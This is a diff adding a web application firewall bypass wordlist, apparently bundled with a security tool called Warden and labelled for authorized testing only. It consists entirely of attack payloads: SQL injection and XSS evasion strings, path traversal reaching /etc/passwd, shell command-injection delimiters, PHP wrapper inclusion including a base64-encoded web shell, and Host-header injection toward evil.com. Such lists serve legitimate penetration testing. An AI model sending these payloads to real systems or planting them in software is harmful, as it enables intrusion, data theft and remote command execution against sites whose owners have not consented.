@@ -1,0 +1,300 @@
+# WAF Bypass Payloads (Documentation Only)
+# Embedded in Warden binary for reference
+# WARNING: These payloads are for authorized security testing only
+# Always obtain written permission before testing
+
+# ============================================
+# SQL INJECTION BYPASS TECHNIQUES
+# ============================================
+
+# Comment-based evasion
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+" OR "1"="1"--
+" OR "1"="1"#
+" OR "1"="1"/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1--
+" OR 1=1#
+
+# Inline comment variations
+'/**/OR/**/'1'='1
+'/*!00000OR*/1=1--
+'/*COMMENT*/OR/*COMMENT*/'1'='1
+'/*!00000UNION*//*!00000SELECT*//*!00000NULL*/--
+UNION/**/SELECT/**/NULL--
+SEL/**/ECT/**/*/**/FR/**/OM/**/users
+
+# Case variation
+' UnIoN SeLeCt NuLL --
+' uNiOn sElEcT nUlL --
+' UNION SELECT NULL --
+' union select null --
+' UnIoN SeLeCt 1,2,3,4 --
+
+# Encoding variants (URL encoded)
+%27%20OR%20%271%27%3D%271
+%2527%2520OR%2520%25271%2527%3D%25271
+%u0027%20OR%20%u00271%u0027=%u00271
+0x27204f52202731273d2731
+
+# Whitespace alternatives
+'%09OR%09'1'='1
+'%0AOR%0A'1'='1
+'%0BOR%0B'1'='1
+'%0COR%0C'1'='1
+'%0DOR%0D'1'='1
+'%A0OR%A0'='A0'='1'
+
+# Logical operator alternatives
+' || '1'='1
+' && '1'='1
+' | '1'='1
+' & '1'='1
+' XOR '1'='1
+1||1=1
+1&&1=1
+1|1=1
+1&1=1
+
+# Function-based
+' OR SUBSTR('a',1,1)='a'--
+' OR ASCII('a')=97--
+' OR CHAR(97)=CHAR(97)--
+' OR HEX('a')=HEX('a')--
+
+# Time-based blind (for detection only)
+'; WAITFOR DELAY '00:00:05'--
+' AND SLEEP(5)--
+' AND BENCHMARK(5000000,MD5(1))--
+' OR pg_sleep(5)--
+
+# ============================================
+# XSS (CROSS-SITE SCRIPTING) BYPASS
+# ============================================
+
+# HTML entity encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+# Unicode encoding
+%u003Cscript%u003Ealert(1)%u003C/script%u003E
+%u0022%u003E%u003Cimg%20src=x%20onerror=alert(1)%u003E
+%c0%bcscript%c0%bealert(1)%c0%bc/script%c0%be
+
+# JavaScript obfuscation
+<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>
+<svg><script>alert(atob('WFNT'))</script></svg>
+<svg><script>alert(/XSS/.source)</script></svg>
+<svg><script>eval('ale'+'rt(1)')</script></svg>
+<svg><script>alert\u0000(1)</script></svg>
+<svg><script>\u0061\u006c\u0065\u0072\u0074(1)</script></svg>
+
+# Event handler variations
+<img src=x onerror=alert(1)>
+<img src=x onerror&#61;alert(1)>
+<img src=x onerror&equals;alert(1)>
+<img src=x oNerror=alert(1)>
+<img src=x OnError=alert(1)>
+<svg/onload=alert(1)>
+<body/onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+
+# Tag variations
+<svg><script>alert(1)</script></svg>
+<math><script>alert(1)</script></math>
+<iframe srcdoc=<script>alert(1)</script>>
+<body><script>alert(1)</script></body>
+<details><script>alert(1)</script></details>
+<marquee><script>alert(1)</script></marquee>
+<xmp><script>alert(1)</script></xmp>
+
+# Attribute-based
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=`alert(1)`>
+<img src=x onerror=\x61\x6c\x65\x72\x74(1)>
+<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
+
+# CSS-based
+<style>img{src:x;content:url('javascript:alert(1)')}</style>
+<div style="background:url('javascript:alert(1)')">
+<style>@import 'javascript:alert(1)'</style>
+
+# DOM-based
+#x
+<svg><animate href=x attributeName=href to=javascript:alert(1) />
+<a href="j&#97;v&#97;script:&#97;lert(1)">click</a>
+
+# ============================================
+# PATH TRAVERSAL BYPASS
+# ============================================
+
+# Basic path traversal
+../../../etc/passwd
+..\..\..\..\..\..\..\..\windows\win.ini
+....//....//....//etc/passwd
+..../..../..../etc/passwd
+././././././etc/passwd
+
+# Unicode encoding (for IIS)
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd
+..%f0%80%80%af..%f0%80%80%af..%f0%80%80%afetc/passwd
+
+# Double encoding
+%252e%252e%252f
+%252e%252e%255c
+%252e%252e%252fetc%252fpasswd
+%255c..%255c..%255cetc%255cpasswd
+
+# UTF-16 encoding
+..%u002e%u002e%u002f
+..%u002e%u002e%u005c
+%u002e%u002e%u002fetc%u002fpasswd
+
+# Null byte injection
+../../../etc/passwd%00.jpg
+../../../boot.ini%00.html
+
+# Mixed encoding
+..%5c..%5c..%5cetc/passwd
+%2e%2e%2fetc%2fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+..%255c..%255c..%255cboot.ini
+
+# Alternative representations
+/../../../../etc/passwd
+\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# ============================================
+# HEADER-BASED BYPASS TECHNIQUES
+# ============================================
+
+# X-Forwarded-For spoofing
+# Note: These are headers, not URL parameters
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: ::1
+X-Forwarded-For: localhost
+X-Forwarded-For: 10.0.0.1
+X-Real-IP: 127.0.0.1
+X-Original-For: 127.0.0.1
+
+# URL override headers
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+
+# Host header injection
+Host: localhost
+Host: 127.0.0.1
+Host: 0.0.0.0
+Host: target.com@evil.com
+Host: evil.com@target.com
+Host: evil.com
+Host: target.com.evil.com
+
+# Other useful headers
+X-HTTP-Method-Override: PUT
+X-Method-Override: DELETE
+X-HTTP-Method: PATCH
+
+# ============================================
+# GENERAL BYPASS TECHNIQUES
+# ============================================
+
+# Parameter pollution
+id=1&id=2
+id=1&id=UNION SELECT NULL
+id[]=1&id[]=2
+search=test&search=admin
+user=admin&user=user
+
+# Method override (using headers)
+POST /admin/delete HTTP/1.1
+X-HTTP-Method-Override: DELETE
+
+# Content-Type manipulation
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+Content-Type: text/xml
+Content-Type: application/json
+
+# Alternative delimiters
+;cat%20/etc/passwd
+|cat%20/etc/passwd
+&cat%20/etc/passwd
+$cat%20/etc/passwd
+`cat%20/etc/passwd`
+$(cat%20/etc/passwd)
+
+# Command substitution alternatives
+;whoami
+;id
+;pwd
+;ls -la
+;cat /etc/issue
+
+# ============================================
+# RFI/LFI BYPASS
+# ============================================
+
+# PHP wrapper variants
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/zlib.deflate/resource=index.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
+expect://id
+zip:///path/to/file.zip%23shell.php
+
+# Null byte for extension bypass
+shell.php%00.jpg
+config.php%00.html
+../../../etc/passwd%00.jpg
+
+# ============================================
+# ADDITIONAL EVASION TECHNIQUES
+# ============================================
+
+# User-Agent spoofing
+User-Agent: Googlebot
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
+User-Agent: bingbot
+User-Agent: facebookexternalhit
+
+# Referer-based bypass
+Referer: https://google.com
+Referer: https://facebook.com
+Referer: https://trusted-site.com
+
+# Cookie manipulation
+Cookie: session=admin
+Cookie: role=admin
+Cookie: user_level=999
+Cookie: auth_token=eyJh
+
+# Random parameter injection
+?random=12345&ignore=true&test=true
+?debug=false&admin=true&bypass=true
+?__a=1&__b=2&__c=3
+
+# Fragment bypass
+#admin
+#/admin
+#admin.php
+
+# ============================================
+# END OF WAF BYPASS WORDLIST
+# ============================================
+# Total payloads: 200+
+# For authorized testing only
